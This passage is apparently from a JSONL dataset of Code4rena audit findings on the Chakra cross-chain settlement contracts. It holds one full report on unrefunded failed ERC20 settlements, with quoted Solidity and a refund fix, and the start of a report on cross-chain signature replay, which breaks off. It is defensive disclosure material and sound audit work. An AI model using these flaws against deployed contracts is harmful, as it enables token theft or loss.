`ChakraSettlementHandler.receive_cross_chain_callback` function, when the cross-chain ERC20 settlement fails, such as due to that the source chain's handler can be removed from the whitelist for the destination chain after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller cannot get back and loses the tokens that have been transferred to the source chain's handler or burned on the source chain by such caller.\n", "recommendation_md": "## Recommended Mitigation Steps\nThe `ChakraSettlementHandler.receive_cross_chain_callback` function can be updated to transfer the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `MintBurn`, `LockUnlock`, or `LockMint` mode. If possible, such function can also be updated to mint the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `BurnUnlock` mode; otherwise, if the corresponding token cannot be minted by the protocol, the protocol needs to clearly communicate with its users about the inability of refunding the failed cross-chain ERC20 settlement's token amount under the `BurnUnlock` mode.\n\n\n## Assessed type\n\nContext\n", "poc_md": "## Proof of Concept\nWhen the `ChakraSettlementHandler.cross_chain_erc20_settlement` function is called to initiate a cross-chain ERC20 settlement, the function caller can check to ensure that the handler on the source chain is whitelisted on the destination chain. After such function call, the function caller has transferred tokens to the handler on the source chain under the `MintBurn`, `LockUnlock`, or `LockMint` mode or burned tokens on the source chain under the `BurnUnlock` mode.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\n```solidity\n    function cross_chain_erc20_settlement(\n        string memory to_chain,\n        uint256 to_handler,\n        uint256 to_token,\n        uint256 to,\n        uint256 amount\n    ) external {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n\n@>      if (mode == SettlementMode.MintBurn) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockUnlock) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockMint) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.BurnUnlock) {\n@>          _erc20_burn(msg.sender, amount);\n@>      }\n\n        ...\n    }\n```\n\nYet, after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, it is possible that the `ChakraSettlementHandler.remove_handler` function is called on the destination chain, which removes the source chain's handler from the whitelist for the destination chain. This is beyond the control of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller because such function caller cannot know this in advance.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\n```solidity\n    function remove_handler(\n        string memory chain_name,\n        uint256 handler\n    ) external onlyOwner {\n@>      handler_whitelist[chain_name][handler] = false;\n    }\n```\n\nWhen the corresponding cross-chain message is received on the destination chain, since the handler on the source chain has been changed to be not whitelisted on the destination chain, the `ChakraSettlementHandler.receive_cross_chain_msg` function would return `false`, which marks the `status` and `receive_cross_txs[txid].status` corresponding to the cross-chain message as failed in the `ChakraSettlement.receive_cross_chain_msg` function.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n@>          return false;\n        }\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        ...\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n@>      CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n@>      } else {\n@>          receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nBack on the source chain, the `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` functions are then called with the failed cross-chain message's `status`. This notifies that the corresponding cross-chain ERC20 settlement has failed by marking the corresponding `create_cross_txs[txid].status` as failed in both the `ChakraSettlement` and `ChakraSettlementHandler` contracts. However, such `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` function calls do not refund the caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function the tokens that were transferred to the source chain's handler or burned on the source chain by such caller.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n@>      } else {\n@>          create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n@>      if (status == CrossChainMsgStatus.Failed) {\n@>          create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n\n# Vulnerability details\n\n## Impact\nBecause there is no refund mechanism in the `ChakraSettlement.processCrossChainCallback` or `ChakraSettlementHandler.receive_cross_chain_callback` function, when the cross-chain ERC20 settlement fails, such as due to that the source chain's handler can be removed from the whitelist for the destination chain after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller cannot get back and loses the tokens that have been transferred to the source chain's handler or burned on the source chain by such caller.\n\n## Proof of Concept\nWhen the `ChakraSettlementHandler.cross_chain_erc20_settlement` function is called to initiate a cross-chain ERC20 settlement, the function caller can check to ensure that the handler on the source chain is whitelisted on the destination chain. After such function call, the function caller has transferred tokens to the handler on the source chain under the `MintBurn`, `LockUnlock`, or `LockMint` mode or burned tokens on the source chain under the `BurnUnlock` mode.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\n```solidity\n    function cross_chain_erc20_settlement(\n        string memory to_chain,\n        uint256 to_handler,\n        uint256 to_token,\n        uint256 to,\n        uint256 amount\n    ) external {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n\n@>      if (mode == SettlementMode.MintBurn) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockUnlock) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockMint) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.BurnUnlock) {\n@>          _erc20_burn(msg.sender, amount);\n@>      }\n\n        ...\n    }\n```\n\nYet, after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, it is possible that the `ChakraSettlementHandler.remove_handler` function is called on the destination chain, which removes the source chain's handler from the whitelist for the destination chain. This is beyond the control of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller because such function caller cannot know this in advance.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\n```solidity\n    function remove_handler(\n        string memory chain_name,\n        uint256 handler\n    ) external onlyOwner {\n@>      handler_whitelist[chain_name][handler] = false;\n    }\n```\n\nWhen the corresponding cross-chain message is received on the destination chain, since the handler on the source chain has been changed to be not whitelisted on the destination chain, the `ChakraSettlementHandler.receive_cross_chain_msg` function would return `false`, which marks the `status` and `receive_cross_txs[txid].status` corresponding to the cross-chain message as failed in the `ChakraSettlement.receive_cross_chain_msg` function.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n@>          return false;\n        }\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        ...\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n@>      CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n@>      } else {\n@>          receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nBack on the source chain, the `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` functions are then called with the failed cross-chain message's `status`. This notifies that the corresponding cross-chain ERC20 settlement has failed by marking the corresponding `create_cross_txs[txid].status` as failed in both the `ChakraSettlement` and `ChakraSettlementHandler` contracts. However, such `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` function calls do not refund the caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function the tokens that were transferred to the source chain's handler or burned on the source chain by such caller.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n@>      } else {\n@>          create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n@>      if (status == CrossChainMsgStatus.Failed) {\n@>          create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe `ChakraSettlementHandler.receive_cross_chain_callback` function can be updated to transfer the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `MintBurn`, `LockUnlock`, or `LockMint` mode. If possible, such function can also be updated to mint the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `BurnUnlock` mode; otherwise, if the corresponding token cannot be minted by the protocol, the protocol needs to clearly communicate with its users about the inability of refunding the failed cross-chain ERC20 settlement's token amount under the `BurnUnlock` mode.\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n\n# Vulnerability details\n\n## Impact\nBecause there is no refund mechanism in the `ChakraSettlement.processCrossChainCallback` or `ChakraSettlementHandler.receive_cross_chain_callback` function, when the cross-chain ERC20 settlement fails, such as due to that the source chain's handler can be removed from the whitelist for the destination chain after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller cannot get back and loses the tokens that have been transferred to the source chain's handler or burned on the source chain by such caller.\n\n## Proof of Concept\nWhen the `ChakraSettlementHandler.cross_chain_erc20_settlement` function is called to initiate a cross-chain ERC20 settlement, the function caller can check to ensure that the handler on the source chain is whitelisted on the destination chain. After such function call, the function caller has transferred tokens to the handler on the source chain under the `MintBurn`, `LockUnlock`, or `LockMint` mode or burned tokens on the source chain under the `BurnUnlock` mode.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\n```solidity\n    function cross_chain_erc20_settlement(\n        string memory to_chain,\n        uint256 to_handler,\n        uint256 to_token,\n        uint256 to,\n        uint256 amount\n    ) external {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n\n@>      if (mode == SettlementMode.MintBurn) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockUnlock) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockMint) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.BurnUnlock) {\n@>          _erc20_burn(msg.sender, amount);\n@>      }\n\n        ...\n    }\n```\n\nYet, after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, it is possible that the `ChakraSettlementHandler.remove_handler` function is called on the destination chain, which removes the source chain's handler from the whitelist for the destination chain. This is beyond the control of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller because such function caller cannot know this in advance.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\n```solidity\n    function remove_handler(\n        string memory chain_name,\n        uint256 handler\n    ) external onlyOwner {\n@>      handler_whitelist[chain_name][handler] = false;\n    }\n```\n\nWhen the corresponding cross-chain message is received on the destination chain, since the handler on the source chain has been changed to be not whitelisted on the destination chain, the `ChakraSettlementHandler.receive_cross_chain_msg` function would return `false`, which marks the `status` and `receive_cross_txs[txid].status` corresponding to the cross-chain message as failed in the `ChakraSettlement.receive_cross_chain_msg` function.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n@>          return false;\n        }\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        ...\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n@>      CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n@>      } else {\n@>          receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nBack on the source chain, the `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` functions are then called with the failed cross-chain message's `status`. This notifies that the corresponding cross-chain ERC20 settlement has failed by marking the corresponding `create_cross_txs[txid].status` as failed in both the `ChakraSettlement` and `ChakraSettlementHandler` contracts. However, such `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` function calls do not refund the caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function the tokens that were transferred to the source chain's handler or burned on the source chain by such caller.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n@>      } else {\n@>          create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n@>      if (status == CrossChainMsgStatus.Failed) {\n@>          create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe `ChakraSettlementHandler.receive_cross_chain_callback` function can be updated to transfer the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `MintBurn`, `LockUnlock`, or `LockMint` mode. If possible, such function can also be updated to mint the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `BurnUnlock` mode; otherwise, if the corresponding token cannot be minted by the protocol, the protocol needs to clearly communicate with its users about the inability of refunding the failed cross-chain ERC20 settlement's token amount under the `BurnUnlock` mode.\n\n\n## Assessed type\n\nContext"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-118", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 118, "page_start": null, "title": "`ChakraSettlement.receive_cross_chain_msg` and `ChakraSettlement.receive_cross_chain_callback` functions do not ensure that receiving `ChakraSettlement` contract's `contract_chain_name` must match `to_chain` corresponding to respective `txid` input though they should", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L256-L283\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L285-L301\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n\n# Vulnerability details\n\n## Impact\nBecause the `ChakraSettlement.receive_cross_chain_msg` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` corresponding to its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_msg` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, the handler on `to_chain` B can incorrectly mint or transfer tokens to recipients though such recipients should only receive such token amounts on `to_chain` A and not on `to_chain` B.\n\nSimilarly, since the `ChakraSettlement.receive_cross_chain_callback` function does not ensure that the receiving `ChakraSettlement` contract's `contract_chain_name` must match the `to_chain` associated with its `txid` input, the signatures that should only be used for calling the `ChakraSettlement.receive_cross_chain_callback` function on `to_chain` A can also be allowed to be used on `to_chain` B. As a result, `to_chain` B's handler's `receive_cross_chain_callback` function logics can be incorrectly triggered, such as burning the corresponding token amount held by such handler on `to_chain` B under the `MintBurn` mode though such token amount should only be burned on `to_chain` A and not on `to_chain` B.\n\n## Proof of Concept\nWhen a validator is deterministically deployed, it can have the same address on different chains. When a handler is deterministically deployed, it can have the same address on different chains. Therefore, it 